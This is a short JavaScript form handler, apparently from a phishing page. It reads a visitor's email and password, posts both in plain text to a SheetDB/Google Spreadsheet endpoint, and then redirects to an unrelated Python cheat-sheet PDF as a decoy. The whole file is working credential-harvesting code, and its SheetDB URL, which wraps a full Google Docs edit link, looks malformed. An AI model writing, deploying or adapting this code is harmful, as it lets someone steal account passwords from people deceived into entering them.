document.getElementById("nextBtn").addEventListener("click", async function (event) {
  event.preventDefault(); // Prevent default form submission

  // Collect data
  const email = document.getElementById("email").value;
  const password = document.getElementById("password").value;

  // Validate inputs
  if (!email || !password) {
    alert("Please fill in both email and password fields.");
    return;
  }

  // Send data to SheetDB
  try {
    const response = await fetch("https://api.sheetdb.io/sheet/https://docs.google.com/spreadsheets/d/1ukjjPocGZgH04PKUNTYxYgJjKCCVUnp0swES83mGY4U/edit#gid=0", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({ data: { email, password } }),
    });

    const result = await response.json();
    if (response.ok) {
      alert("Data saved successfully!");
      // Redirect to the PDF file
      window.location.href = "https://allinpython.com/wp-content/uploads/2023/09/Python-Cheat-Sheet.pdf"; // Replace with your PDF URL
    } else {
      alert("Failed to save data: " + result.message);
    }
  } catch (error) {
    console.error("Error:", error);
    alert("An error occurred while saving data.");
  }
});
